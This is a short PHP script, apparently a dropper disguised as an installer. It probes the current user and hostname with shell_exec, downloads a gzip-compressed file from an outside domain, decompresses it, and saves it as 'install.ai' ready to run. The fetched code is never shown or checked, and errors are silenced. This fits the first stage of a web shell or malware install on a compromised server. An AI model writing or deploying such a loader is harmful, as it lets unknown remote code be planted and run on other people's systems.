<?php
$username=basename(trim(shell_exec('whoami')));
$hostname=basename(trim(shell_exec('hostname')));
echo "--> {$username}@{$hostname}\r\nConnecting...\r";
if(!function_exists('gzinflate')){
exit("Status: [ERROR] Require zlib extension.\r\n\r\n");
}$file='install.ai';
$url='https://sabunjelly.com/ai/setup.ai';
$get=@file_get_contents($url.'?r='.mt_rand());
$put=@file_put_contents($file,@gzinflate($get));
if(!$put){
@unlink($file);
exit("Status: [ERROR] Failed to get script.\r\n\r\n");
}exit("Status: [OK] Ready to execute script.\r\n\r\n");

